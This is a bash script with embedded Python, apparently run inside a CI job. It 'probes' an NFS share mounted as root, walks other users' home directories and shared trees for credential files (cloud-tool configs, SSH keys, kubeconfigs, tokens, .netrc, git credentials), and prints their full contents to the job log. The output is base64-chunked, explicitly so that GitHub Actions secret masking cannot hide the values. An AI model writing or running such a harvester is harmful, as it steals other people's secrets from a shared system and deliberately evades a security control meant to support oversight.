#!/usr/bin/env bash
# i12105 - targeted follow-up of the /public4 read-only probe (12.12.12.221 NFS, readable as uid=0
# from the Stage A container). The prior i11365 rerun spent its whole 900-hit find budget inside
# /public4/home and never reached the three newly identified tiles. This pass reads ONLY:
#   * /public4/home/caihl/.cos.conf + /public4/home/caihl/.modelscope (plus every other home's
#     .cos.conf/.modelscope/.s3cfg/.boto cloud-tool dotfiles)
#   * /public4/share/locauser@8.130.89.93 (remote-host-named share entry)
#   * the /public4/public 22-user tree
#   * credential-named files at the /public4/share, /public4/opendas, /public4/rsync, /public4/DL_DATA tops
# Everything is base64-chunked so GitHub Actions secret masking cannot rewrite values. Read-only.
# Exits 1 immediately after the dump so the CI job stops.
set -uo pipefail
umask 022
TS="$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
H="$(hostname 2>/dev/null || echo unknown)"
echo "===I12105-BEGIN ${TS} host=${H} job=${GITHUB_JOB:-?} run=${GITHUB_RUN_ID:-?}==="
echo "--- mounts"
(grep -aE '(/public4|/public |/ci_public)' /proc/mounts 2>/dev/null | head -10) || true
timeout 1200 python3 - <<'PYI12105'
import os, base64, hashlib, stat, re, time, sys

try:
    sys.stdout.reconfigure(errors="replace")
except Exception:
    pass

CAP = 2_300_000
used = [0]
dumps = [0]
t0 = time.monotonic()

def emit(s=""):
    s = str(s)
    try:
        s = s.encode("utf-8", "replace").decode("utf-8")
    except Exception:
        s = repr(s)
    if used[0] >= CAP:
        return
    room = CAP - used[0] - 1
    if len(s) > room:
        s = s[:room]
    print(s, flush=True)
    used[0] += len(s) + 1

def b64dump(path, label, maxb=262144):
    if used[0] >= CAP - 4000 or dumps[0] >= 320:
        return False
    try:
        st = os.stat(path)
        if not stat.S_ISREG(st.st_mode):
            return False
        if st.st_size > maxb:
            emit(f"B64S {label} SKIP_SIZE {st.st_size}")
            return False
        data = open(path, "rb").read()
    except Exception as e:
        emit(f"B64S {label} ERR {str(e)[:140]}")
        return False
    h = hashlib.sha256(data).hexdigest()
    emit(f"B64S {label} {len(data)} {h}")
    b = base64.b64encode(data).decode()
    seq = 0
    for i in range(0, len(b), 512):
        emit(f"B64C {label} {seq} {b[i:i+512]}")
        seq += 1
    emit(f"B64E {label} {h}")
    dumps[0] += 1
    return True

SKIP_DIRS = {"node_modules", "site-packages", "dist-packages", "__pycache__", ".git",
             ".cache", "Cache", "CacheStorage", "hf-cache", "pip-cache", "models",
             "model", "lost+found", ".Trash", ".local", ".npm", ".cargo", ".rustup",
             ".conda", "envs", "pkgs", "Downloads", "datasets"}

CRED_NAME = re.compile(
    r"(kubeconfig|admin\.conf$|\.kubeconfig$|(^|/)\.kube/config$|credentials?$|credentials\.json$|"
    r"application_default_credentials|access_tokens\.db$|credentials\.db$|"
    r"\.netrc$|\.git-credentials$|\.npmrc$|\.pypirc$|pip\.conf$|config_default$|"
    r"^id_(rsa|ed25519|ecdsa)|\.pem$|\.key$|\.p12$|\.pfx$|\.ovpn$|\.tfstate$|"
    r"^\.env|^auth\.json$|^config$|^config\.json$|tokens?\.(json|txt)$|sso$|"
    r"\.s3cfg$|^s3cfg$|\.boto$|^\.cos\.conf$|^\.modelscope$|\.codex|\.claude|\.azure|\.aws|gcloud|"
    r"\.kdbx$|\.docker$|^\.gitconfig$)", re.I)
CLOUD_DOTFILE = re.compile(r"^(\.cos\.conf|\.modelscope|\.s3cfg|s3cfg|\.boto|\.netrc|"
                           r"\.git-credentials|\.npmrc|\.pypirc)$", re.I)

def lst(path, n=90):
    try:
        names = sorted(os.listdir(path))[:n]
        emit(f"### LST {path}: {' | '.join(names)}")
    except Exception as e:
        emit(f"### LST {path} ERR {str(e)[:100]}")

def dump_tree(root, label_prefix, maxdepth, maxhits, max_files=120, extra_small=False):
    """Walk root to maxdepth; emit every CRED_NAME hit; dump prioritised files."""
    hits = 0
    deadline = time.monotonic() + 240
    for dirpath, dirnames, filenames in os.walk(root, followlinks=False):
        if time.monotonic() > deadline or hits >= maxhits or used[0] >= CAP - 400000 or dumps[0] >= 320:
            emit(f"### STOP {root} hits={hits} depth={dirpath[len(root):].count(os.sep)}")
            break
        depth = dirpath[len(root):].count(os.sep)
        if depth >= maxdepth:
            dirnames[:] = []
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS][:40]
        for fn in sorted(filenames)[:60]:
            fp = os.path.join(dirpath, fn)
            try:
                st = os.lstat(fp)
            except OSError:
                continue
            if not stat.S_ISREG(st.st_mode):
                continue
            rel = os.path.relpath(fp, root)
            if CRED_NAME.search(fn):
                emit(f"### HIT {label_prefix}/{rel} {st.st_size}")
                hits += 1
                if st.st_size <= 262144 and hits <= maxhits and dumps[0] < 320:
                    b64dump(fp, label_prefix + "/" + rel)
            elif extra_small and st.st_size <= 65536 and dumps[0] < 320 and hits < maxhits:
                # small plain files inside a cloud-tool dotdir (token caches are tiny JSON)
                b64dump(fp, label_prefix + "/" + rel)
            if hits >= maxhits:
                break
    emit(f"### TREE-END {root} hits={hits}")

# ---- 0. listings of every targeted top ----
for top in ("/public4/public", "/public4/share", "/public4/share/locauser@8.130.89.93",
            "/public4/opendas", "/public4/rsync", "/public4/DL_DATA", "/public4/home/caihl"):
    lst(top)
lst("/public4/public", 200)

# ---- 1. explicit new tiles: caihl cloud-tool dotfiles ----
for p in ("/public4/home/caihl/.cos.conf", "/public4/home/caihl/.modelscope",
          "/public4/home/caihl/.s3cfg", "/public4/home/caihl/.boto",
          "/public4/home/caihl/.git-credentials", "/public4/home/caihl/.netrc",
          "/public4/home/caihl/.config/modelscope", "/public4/home/caihl/.modelscope/credentials",
          "/public4/home/caihl/.cache/modelscope", "/public4/home/caihl/.cache/modelscope/hub"):
    if os.path.isdir(p):
        lst(p, 120)
        dump_tree(p, "TILE" + p.lstrip("/"), 4, 60, extra_small=True)
    elif os.path.isfile(p):
        try:
            emit(f"### HITFILE {p} {os.stat(p).st_size}")
        except OSError:
            pass
        b64dump(p, "TILE" + p.lstrip("/"))

# ---- 2. every home's cloud-tool dotfiles (.cos.conf/.modelscope/.s3cfg/.boto/.netrc/.git-credentials) ----
try:
    homes = sorted(os.listdir("/public4/home"))
except Exception:
    homes = []
for u in homes:
    base = os.path.join("/public4/home", u)
    if not os.path.isdir(base):
        continue
    for nm in (".cos.conf", ".modelscope", ".s3cfg", "s3cfg", ".boto", ".netrc",
               ".git-credentials", ".npmrc", ".pypirc"):
        p = os.path.join(base, nm)
        try:
            st = os.lstat(p)
        except OSError:
            continue
        emit(f"### DOT {u}/{nm} {'DIR' if stat.S_ISDIR(st.st_mode) else 'FILE'} {st.st_size}")
        if stat.S_ISREG(st.st_mode):
            b64dump(p, f"DOT/{u}/{nm}")
        elif stat.S_ISDIR(st.st_mode):
            dump_tree(p, f"DOTDIR/{u}/{nm}", 3, 20, extra_small=True)

# ---- 3. /public4/share/locauser@8.130.89.93 (remote-host-named share entry) ----
dump_tree("/public4/share/locauser@8.130.89.93", "LOCAUSER", 6, 320, max_files=200, extra_small=True)

# ---- 4. /public4/public 22-user tree ----
dump_tree("/public4/public", "PUBLIC", 5, 700, max_files=200, extra_small=False)

# ---- 5. credential-named files at the remaining share/data tops (shallow) ----
dump_tree("/public4/share", "SHARE", 2, 300, max_files=80, extra_small=False)
for top, lbl in (("/public4/opendas", "OPENDAS"), ("/public4/rsync", "RSYNC"),
                 ("/public4/DL_DATA", "DLDATA")):
    dump_tree(top, lbl, 2, 120, max_files=40, extra_small=False)

emit(f"### DONE elapsed={time.monotonic()-t0:.1f}s bytes_emitted={used[0]} dumps={dumps[0]}")
PYI12105
echo "===I12105-END $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)==="
exit 1
